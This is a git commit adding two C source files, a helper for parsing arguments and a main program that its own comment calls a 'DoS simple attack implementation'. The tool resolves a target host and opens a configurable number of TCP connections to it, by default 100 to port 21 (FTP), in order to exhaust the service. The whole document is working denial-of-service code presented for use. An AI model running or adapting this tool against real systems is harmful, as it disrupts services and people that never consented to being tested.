9ce7e65289c3b2c29bc5a1e42ca8f6b45bbb1a15
Giovani Ferreira <silva.giovanif@gmail.com>
2016-07-11 16:03:48 -0300

    Separe in helper files

---
+++ dos_helper.c
@@ -0,0 +1,79 @@
+#include<arpa/inet.h>
+#include<stdio.h>
+#include<stdlib.h>
+#include<string.h>
+#include<netdb.h>
+
+#include"dos_helper.h"
+
+#define LAST_PORT 65535
+
+_Bool is_valid_ip(char *ip)
+{
+    struct sockaddr_in sa;
+    int result = inet_pton(AF_INET, ip, &(sa.sin_addr));
+
+    return result != 0;
+}
+
+void display_help(char *msg, _Bool with_error)
+{
+    printf(":: Error: %s\n", msg);
+    printf("\nUsage: dos [DOMAIN/IP] [PORT]\n");
+    printf("");
+
+    exit(with_error);
+}
+
+void parse_args(int argc, char *argv[], int *port, char **target_host, int *connections, _Bool *verbose)
+{
+    if (argc < 2) {
+        display_help("You must pass the domain/ip for DoS", true);
+    }
+    
+    for (short i = 1; i < argc; i++) {
+        if (strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "--port") == 0) {
+            if (atoi(argv[i + 1]) != 0) {
+                *port = atoi(argv[i + 1]); 
+
+                if (*port < 1 || *port > LAST_PORT) {
+                    display_help("Port must be in a range from 1 to 65535", true); 
+                }
+
+                i++;
+                continue;
+            } else {
+                display_help("Port must be a number", true); 
+            } 
+        }
+
+        if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0) {
+            *verbose = true; 
+            continue;
+        }
+
+        if (strcmp(argv[i], "-c") == 0 || strcmp(argv[i], "--connections") == 0) {
+            if (atoi(argv[i + 1]) != 0) {
+                *connections = atoi(argv[i + 1]); 
+                i++;
+                continue;
+            } else {
+                display_help("Number of connections must be a number", true); 
+            }
+        }
+
+        if (*target_host == NULL) {
+            *target_host = argv[i];
+
+            if (!is_valid_ip(*target_host)) {
+                struct hostent *host;
+                host = gethostbyname(*target_host);
+                *target_host = inet_ntoa(*((struct in_addr *)host->h_addr));
+            }
+
+            continue;
+        } 
+
+        display_help("Unknow argument", true);
+    }
+}
---
+++ main.c
@@ -0,0 +1,49 @@
+/*
+ * DoS simple attack implementation by Giovani Ferreira
+ */
+
+#include<stdio.h>
+#include<netdb.h>
+#include<arpa/inet.h>
+#include<stdlib.h>
+#include"dos_helper.h"
+
+#define DEFAULT_PORT 21                             /* Default port for attack - Setted to 21 = FTP */
+#define CONNECTIONS 100                             /* Number of connections to open with the service */
+
+int main(int argc, char *argv[])
+{
+    int sock = 0, connection = 0;
+    int port = DEFAULT_PORT;                        /* Service port */
+    char* target_host = NULL;                       /* The domain/ip to perform the attack */
+    int qnt_conn = CONNECTIONS;                     /* The desired number of connections to open */
+    _Bool verbose = false;                          /* Operation mode set to quiet for default */
+    struct sockaddr_in target;
+
+    parse_args(argc, argv, &port, &target_host, &qnt_conn, &verbose);
+
+    printf("==> Starting DoS in %s\n", target_host);
+    printf("==> Attempting %d connections at port %d\n", qnt_conn, port);
+
+    /* Oppening connections in service */
+    for(int i = 0; i < qnt_conn; i++){
+        sock = socket(AF_INET, SOCK_STREAM, 0);
+       
+        target.sin_family = AF_INET;
+        target.sin_port = htons(port);
+        target.sin_addr.s_addr = inet_addr(target_host);
+
+        connection = connect(sock, (struct sockaddr *)&target, sizeof(target));
+
+        if (connection == 0) {
+            if (verbose)
+                printf("\tConnection number %d oppened\n", i + 1);
+        } else {
+            printf("\t:: Connection number %d failed\n", i + 1);
+        }
+    }
+
+    printf("==> Finished DoS attack %s:%d\n", target_host, port);
+
+    return 0;
+}
